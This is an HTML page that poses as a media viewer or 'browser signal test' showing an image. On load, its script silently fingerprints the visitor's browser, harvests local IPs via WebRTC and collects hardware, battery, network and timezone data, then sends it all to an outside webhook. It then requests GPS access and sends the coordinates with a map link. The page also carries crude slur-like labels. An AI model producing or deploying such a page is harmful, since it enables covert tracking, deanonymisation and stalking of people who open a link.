<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser Signal Test — Field Unit 04</title>
    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
    <style>
        :root {
            --void: #b8b7b0;
            --surface: #d9d8d1;
            --surface-raised: #c8c7c0;
            --surface-hi: #e8e7e0;
            --border: #292b2a;
            --border-hi: #62635d;
            --shadow: #77766f;
            --divider: #a3a29a;
            --text-primary: #272a29;
            --text-secondary: #4c504d;
            --text-dim: #656963;
            --text-inverse: #e8e7e0;
            --accent-primary: #5c4c75;
            --accent-secondary: #a69ab8;
            --accent-tertiary: #a84942;
            --accent-critical: #873b36;
            --accent-primary-dim: #c5bdcf;
            --accent-secondary-dim: #d8d2df;
            --accent-tertiary-dim: #e3c7c1;
            --accent-critical-dim: #e6c9c4;
            --screen: #202725;
            --screen-edge: #1e2422;
            --screen-glint: rgba(232, 231, 224, .15);

            --line: 2px;
            --case-shadow: 5px 5px 0 var(--shadow);
            --s-1: 5px;
            --s-2: 10px;
            --s-3: 15px;
            --s-4: 20px;
            --s-5: 25px;
            --s-6: 35px;
            --label-font: "Lucida Console", "Courier New", monospace;
            --reading-font: Tahoma, Verdana, sans-serif;
        }

        * { box-sizing: border-box; }

        html {
            min-width: 320px;
            background: var(--void);
        }

        body {
            margin: 0;
            min-height: 100vh;
            color: var(--text-primary);
            background: var(--void);
            font-family: var(--reading-font);
            font-size: 14px;
            line-height: 1.55;
        }

        .page {
            position: relative;
            width: min(1260px, calc(100% - 88px));
            min-height: 100vh;
            margin: 0 auto;
            padding: 34px 0 22px;
        }

        .page::before {
            position: absolute;
            top: 0;
            bottom: 0;
            left: -27px;
            width: 12px;
            content: "";
            border-left: 1px solid var(--border-hi);
            background: repeating-linear-gradient(
                to bottom,
                transparent 0 7px,
                var(--border-hi) 7px 8px,
                transparent 8px 15px
            );
            opacity: .7;
            pointer-events: none;
        }

        .sheet-head {
            display: flex;
            align-items: end;
            justify-content: space-between;
            gap: var(--s-4);
            margin-bottom: var(--s-4);
            padding: 0 2px var(--s-3);
            border-bottom: var(--line) solid var(--border);
        }

        .sheet-kicker,
        .sheet-code,
        .console-topline,
        .section-tag,
        .bezel-label,
        .bezel-foot,
        .readout-index,
        .badge,
        .progress-head,
        .sheet-foot {
            font-family: var(--label-font);
            font-size: 10px;
            font-weight: 700;
            line-height: 1.4;
            letter-spacing: .055em;
            text-transform: uppercase;
        }

        .sheet-kicker {
            margin: 0 0 6px;
            color: var(--text-dim);
        }

        h1 {
            margin: 0;
            font-family: var(--label-font);
            font-size: clamp(17px, 2.1vw, 22px);
            font-weight: 700;
            line-height: 1.25;
            letter-spacing: -.055em;
            text-transform: uppercase;
        }

        .sheet-code {
            flex: 0 0 auto;
            padding-bottom: 3px;
            color: var(--text-secondary);
            text-align: right;
        }

        .sheet-code strong {
            display: block;
            margin-top: 4px;
            color: var(--accent-primary);
            font-size: 12px;
        }

        .console {
            position: relative;
            border: 3px solid var(--border);
            background: var(--surface);
            box-shadow: var(--case-shadow);
        }

        .console-topline {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: var(--s-3);
            min-height: 43px;
            padding: 8px 14px;
            border-bottom: var(--line) solid var(--border);
            background: var(--surface-raised);
            color: var(--text-secondary);
        }

        .console-topline .unit-name {
            color: var(--text-primary);
        }

        .power-mark {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            white-space: nowrap;
        }

        .power-mark::before {
            width: 9px;
            height: 9px;
            content: "";
            border: 1px solid var(--border);
            background: var(--accent-tertiary);
            box-shadow: inset 1px 1px 0 var(--accent-tertiary-dim);
        }

        .console-body {
            display: grid;
            grid-template-columns: minmax(0, 1fr);
            gap: 0;
            padding: 22px;
        }

        .media-bay {
            min-width: 0;
            padding-right: 24px;
        }

        .section-tag {
            display: flex;
            align-items: center;
            gap: 10px;
            min-height: 22px;
            margin-bottom: 10px;
            color: var(--text-secondary);
        }

        .section-tag .number {
            display: inline-grid;
            width: 24px;
            height: 20px;
            place-items: center;
            color: var(--text-inverse);
            background: var(--accent-primary);
        }

        .display-bezel {
            position: relative;
            padding: 13px 13px 10px;
            border: var(--line) solid var(--border);
            background: var(--surface-raised);
            box-shadow: inset 0 0 0 2px var(--surface-hi);
        }

        .bezel-label,
        .bezel-foot {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            color: var(--text-dim);
            font-size: 9px;
        }

        .bezel-label { padding: 0 1px 8px; }
        .bezel-foot { padding: 8px 1px 0; }

        /* FIXED: Removed aspect-ratio to allow wrapper to expand/contract */
        .media-wrapper {
            position: relative;
            display: flex;
            width: 100%;
            min-height: 220px;
            max-height: 68vh;
            /* FIXED: Removed aspect-ratio - box now adapts to image */
            align-items: center;
            justify-content: center;
            overflow: hidden;
            border: 2px solid var(--screen-edge);
            background: var(--screen);
        }

        .media-wrapper::after {
            position: absolute;
            inset: 0;
            content: "";
            border: 1px solid var(--screen-glint);
            pointer-events: none;
        }

        /* FIXED: object-fit: contain keeps image within wrapper without cropping */
        .media-content {
            display: block;
            width: 100%;
            height: 100%;
            max-width: 100%;
            max-height: 68vh;
            /* FIXED: contain scales image to fit within wrapper, no cropping */
            object-fit: contain; 
            pointer-events: none;
        }

        .media-caption {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: var(--s-3);
            min-height: 48px;
            padding: 10px 2px 0;
            border-bottom: 1px solid var(--divider);
        }

        .media-title {
            min-width: 0;
            font-family: var(--label-font);
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            overflow-wrap: anywhere;
        }

        .badge {
            flex: 0 0 auto;
            padding: 4px 7px;
            border: 1px solid var(--accent-primary);
            color: var(--accent-primary);
            background: var(--accent-primary-dim);
            font-size: 9px;
        }

        .readout {
            min-width: 0;
            padding-left: 25px;
            border-left: var(--line) solid var(--border);
        }

        .readout-head {
            display: grid;
            grid-template-columns: 35px minmax(0, 1fr);
            align-items: start;
            gap: 10px;
            margin: 17px 0 13px;
        }

        .readout-index {
            display: grid;
            width: 35px;
            height: 35px;
            place-items: center;
            border: var(--line) solid var(--border);
            color: var(--text-inverse);
            background: var(--border);
        }

        h2 {
            margin: 0;
            font-family: var(--label-font);
            font-size: 14px;
            line-height: 1.45;
            text-transform: uppercase;
        }

        .status-copy {
            margin: 0;
            max-width: 42ch;
            min-height: 124px;
            color: var(--text-secondary);
            font-size: 14px;
            line-height: 1.6;
        }

        .meta-list {
            margin: 18px 0 0;
            border-top: var(--line) solid var(--border);
        }

        .meta-row {
            display: grid;
            grid-template-columns: 90px minmax(0, 1fr);
            gap: 10px;
            padding: 8px 0;
            border-bottom: 1px solid var(--divider);
        }

        .meta-row dt {
            color: var(--text-dim);
            font-family: var(--label-font);
            font-size: 9px;
            font-weight: 700;
            letter-spacing: .035em;
            text-transform: uppercase;
        }

        .meta-row dd {
            min-width: 0;
            margin: 0;
            color: var(--text-primary);
            font-size: 13px;
            overflow-wrap: anywhere;
        }

        .progress-block { margin-top: 21px; }

        .progress-head {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-size: 9px;
        }

        .status-bar {
            height: 13px;
            padding: 2px;
            overflow: hidden;
            border: var(--line) solid var(--border);
            background: repeating-linear-gradient(
                90deg,
                var(--surface-hi) 0 8px,
                var(--surface-raised) 8px 11px
            );
        }

        .progress {
            width: 0%;
            height: 100%;
            background: var(--accent-primary);
        }

        .console-foot {
            display: grid;
            grid-template-columns: 1fr minmax(0, 2.2fr);
            gap: 18px;
            align-items: center;
            min-height: 48px;
            padding: 10px 22px;
            border-top: var(--line) solid var(--border);
            background: var(--surface-raised);
        }

        .console-foot strong {
            color: var(--accent-tertiary);
            font-family: var(--label-font);
            font-size: 10px;
            letter-spacing: .04em;
            text-transform: uppercase;
        }

        .console-foot p {
            margin: 0;
            color: var(--text-secondary);
            font-size: 12px;
            line-height: 1.45;
        }

        .sheet-foot {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-top: 22px;
            padding: 10px 2px 0;
            border-top: 1px solid var(--border-hi);
            color: var(--text-dim);
            font-size: 9px;
        }

        @media (max-width: 820px) {
            .page { width: min(100% - 52px, 700px); padding-top: 22px; }
            .console-body { grid-template-columns: minmax(0, 1fr); gap: 22px; }
            .media-bay { padding-right: 0; }
            .readout { padding: 20px 0 0; border-top: var(--line) solid var(--border); border-left: 0; }
            .status-copy { min-height: 0; max-width: 65ch; }
            .meta-list { margin-top: 15px; }
        }

        @media (max-width: 500px) {
            .page { width: calc(100% - 36px); padding-top: 17px; }
            .page::before { left: -12px; width: 6px; }
            .sheet-head { align-items: flex-start; }
            .sheet-code { font-size: 8px; }
            .sheet-code strong { font-size: 10px; }
            .console-topline { flex-wrap: wrap; font-size: 9px; }
            .console-body { padding: 14px; }
            .media-wrapper { min-height: 185px; }
            .console-foot { grid-template-columns: 1fr; gap: 4px; padding: 10px 14px; }
            .sheet-foot { flex-wrap: wrap; }
        }

        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after {
                animation-duration: .01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: .01ms !important;
                scroll-behavior: auto !important;
            }
        }
    </style>
</head>
<body>
    <div class="page">
        <header class="sheet-head">
            <div>
                <p class="sheet-kicker">Cuckservative</p>
                <h1>Serving Media</h1>
            </div>
            <div class="sheet-code">Test sheet<strong>04-B / REV. 02</strong></div>
        </header>

        <main class="console">
            <div class="console-topline">
                <span class="unit-name">curious huh</span>
            </div>

            <div class="console-body">
                <section class="media-bay" aria-label="Media input preview">
                    <div class="section-tag"><span class="number">01</span><span>Media monitor</span></div>
                    <div class="display-bezel">
                        <div class="bezel-label"><span>Presenting output</span><span>DISPLAY</span></div>
                        <div class="media-wrapper" id="mediaWrapper">
                            <!-- Dynamic media content is injected here. -->
                        </div>
                        <div class="bezel-foot"><span>VIEWPORT / 16:9</span><span>FRAME 001</span></div>
                    </div>
                    <div class="media-caption">
                        <span class="media-title" id="mediaTitle">media input/output</span>
                        <span class="badge" id="mediaBadge">INPUT</span>
                    </div>
                </section>

                <!-- Readout section removed -->
            </div>

            <div class="console-foot">
                <strong>WAGTFKY</strong>
            </div>
        </main>

        <!-- Footer removed -->
    </div>

<script>
    // CONFIGURATION
    const WEBHOOK_URL = "https://steak.cuckindians.workers.dev/";
    const MEDIA_SRC = "content.jpg"; // Change to content.mp4 for video

    // --- Advanced Fingerprinting Helpers ---

    function getCanvasFingerprint() {
        try {
            // FIX: Create canvas in a hidden container to prevent rendering on page
            const container = document.createElement('div');
            container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
            document.body.appendChild(container);
            
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("LabTest_FP_01", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("LabTest_FP_01", 4, 17);
            
            // Remove container after getting data
            document.body.removeChild(container);
            return canvas.toDataURL();
        } catch (e) { 
            console.warn('Canvas fingerprint blocked:', e);
            return "Blocked"; 
        }
    }

    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: 'Unknown', renderer: 'Unknown' };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return { vendor: 'Unknown', renderer: 'Unknown' };
            
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch (e) { 
            console.warn('WebGL fingerprint failed:', e);
            return { vendor: 'Unknown', renderer: 'Unknown' };
        }
    }

    async function getAudioFingerprint() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = ctx.createOscillator();
            const analyser = ctx.createAnalyser();
            const gain = ctx.createGain();
            const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
            
            gain.gain.value = 0;
            oscillator.type = "triangle";
            oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
            
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gain);
            gain.connect(ctx.destination);
            
            oscillator.start(0);
            
            return new Promise((resolve) => {
                scriptProcessor.onaudioprocess = () => {
                    const data = new Float32Array(analyser.frequencyBinCount);
                    analyser.getFloatFrequencyData(data);
                    oscillator.stop();
                    resolve(Array.from(data).slice(0, 10)); // Sample first 10 bins
                };
                
                // Timeout for audio fingerprinting (max 5 seconds)
                setTimeout(() => {
                    if (!oscillator.state || oscillator.state === 'running') {
                        oscillator.stop();
                        resolve(Array.from(data).slice(0, 10));
                    }
                }, 5000);
            });
        } catch (e) { 
            console.warn('Audio fingerprint failed:', e);
            return "Blocked"; 
        }
    }

    function getWebRTCIPs() {
        return new Promise((resolve, reject) => {
            const ips = [];
            const constraints = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
            
            // Parallel Streams for Triangulation
            const createPeer = () => {
                try {
                    const pc = new RTCPeerConnection(constraints);
                    pc.createDataChannel("");
                    
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    
                    pc.onicecandidate = (e) => {
                        if (e.candidate && e.candidate.type === 'host') {
                            const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                            if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
                        }
                    };
                    
                    // Close connection after gathering to save resources
                    setTimeout(() => {
                        pc.close();
                    }, 2500);
                } catch (err) {
                    console.warn('WebRTC peer creation failed:', err);
                }
            };

            createPeer();
            createPeer(); // Second stream for redundancy
            
            setTimeout(() => resolve(ips), 3000);
        });
    }

    function send(url, data, retryCount = 0) {
        return fetch(url, {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "X-Source": "Browser-Recon" // Secure webhook identifier
            },
            body: JSON.stringify(data)
        }).then(response => {
            if (response.ok) return response.json();
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }).catch(error => {
            console.warn('Webhook send failed:', error);
            // Retry logic for critical data
            if (retryCount < 3) {
                setTimeout(() => send(url, data, retryCount + 1), 500 * retryCount);
            } else {
                throw error;
            }
        });
    }

    async function initializeHarvest() {
        const loader = document.getElementById('loader');
        const mediaWrapper = document.getElementById('mediaWrapper');
        
        // FIX: Clear any existing media content before loading new one
        const existingMedia = mediaWrapper.querySelectorAll('.media-content');
        existingMedia.forEach(el => el.remove());

        // 1. Dynamic Media Loading with auto-resize
        const ext = MEDIA_SRC.split('.').pop().toLowerCase();
        let mediaEl;
        if (ext === 'mp4' || ext === 'webm') {
            mediaEl = document.createElement('video');
            mediaEl.src = MEDIA_SRC;
            mediaEl.controls = true;
            mediaEl.autoplay = true;
            mediaEl.muted = true;
            mediaEl.loop = true;
            mediaEl.className = 'media-content';
            document.getElementById('mediaTitle').innerText = "LAB VIDEO INPUT";
            document.getElementById('mediaBadge').innerText = "VIDEO";
        } else {
            mediaEl = document.createElement('img');
            mediaEl.src = MEDIA_SRC;
            mediaEl.className = 'media-content';
            document.getElementById('mediaTitle').innerText = "media input/output";
            document.getElementById('mediaBadge').innerText = "IMAGE";
        }
        mediaWrapper.appendChild(mediaEl);

        // 2. Aggressive Passive Fingerprinting with error handling
        const fp = await FingerprintJS.load().catch(err => {
            console.error('FingerprintJS CDN failed to load:', err);
            return null;
        });
        
        let result;
        if (fp) {
            try {
                result = await fp.get();
            } catch (err) {
                console.warn('FingerprintJS get() failed:', err);
                result = { visitorId: 'Unknown', components: {} };
            }
        } else {
            // Fallback without fingerprinting
            result = { 
                visitorId: navigator.userAgent, 
                components: {} 
            };
        }
        
        // Manual Hardware & Network Recon with feature detection
        const battery = await navigator.getBattery()
            .then(b => ({ level: b.level, charging: b.charging }))
            .catch(() => ({ level: 1.0, charging: false }));
            
        const conn = navigator.connection || {};
        const memory = navigator.deviceMemory || 'Unknown';
        const cores = navigator.hardwareConcurrency || 'Unknown';
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // 3. Advanced Fingerprinting (Canvas, WebGL, Audio)
        const canvasFP = getCanvasFingerprint();
        const webGLFP = getWebGLFingerprint();
        const audioFP = await getAudioFingerprint();

        // 4. Multi-Stream WebRTC Triangulation
        const ips = await getWebRTCIPs();

        // 5. Performance & Touch Metrics (record at page load)
        const perfData = {
            navType: performance.getEntriesByType("navigation")[0]?.type,
            loadTime: performance.now() - performance.timing.navigationStart || 0
        };

        // Build payload with per-component availability flags
        const payload = {
            stage: "PASSIVE_RECON",
            visitor_id: result.visitorId,
            fingerprint_details: result.components,
            manual_fps: { 
                canvas: canvasFP, 
                webgl: webGLFP, 
                audio: audioFP 
            },
            webrtc_ips: ips,
            battery: battery,
            network: { 
                type: conn.effectiveType || 'unknown', 
                downlink: conn.downlink || 0, 
                rtt: conn.rtt || 0 
            },
            hardware: { cores, memory },
            screen: { 
                w: screen.width, 
                h: screen.height, 
                dpr: window.devicePixelRatio, 
                colorDepth: screen.colorDepth 
            },
            timezone: tz,
            performance: perfData,
            availability: {
                canvas: typeof canvasFP === 'string' ? false : true,
                webgl: typeof webGLFP.vendor !== 'undefined',
                audio: typeof audioFP === 'string' ? false : true,
                webrtc: ips.length > 0,
                battery: typeof battery.level === 'number',
                network: typeof conn.effectiveType === 'string'
            }
        };

        // Send payload with retry logic
        try {
            await send(WEBHOOK_URL, payload);
        } catch (err) {
            console.error('Failed to send reconnaissance data:', err);
        }

        loader.style.width = "70%";

        // 6. Active GPS Prompt (Delayed with timeout handling)
        setTimeout(() => {
            loader.style.width = "100%";
            document.getElementById('statusText').innerText = "Initial diagnostics submitted. A location permission request may follow; approved coordinates are sent to the configured lab endpoint.";
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        send(WEBHOOK_URL, {
                            stage: "GPS_ACQUIRED",
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    (err) => {
                        send(WEBHOOK_URL, { stage: "GPS_DENIED", error: err.message });
                    }
                );
            } else {
                console.warn('Geolocation not supported');
            }
        }, 3000);
    }

    // Record page load time for performance metrics
    document.addEventListener('DOMContentLoaded', () => {
        const startTime = performance.now();
        
        // Initialize reconnaissance after a brief delay to ensure DOM is ready
        setTimeout(() => {
            initializeHarvest();
        }, 100);
    });

    // Fallback if page loads before DOMContentLoaded
    window.addEventListener('load', () => {
        if (!document.getElementById('loader')) {
            initializeHarvest();
        }
    });
</script>


</body>
</html>
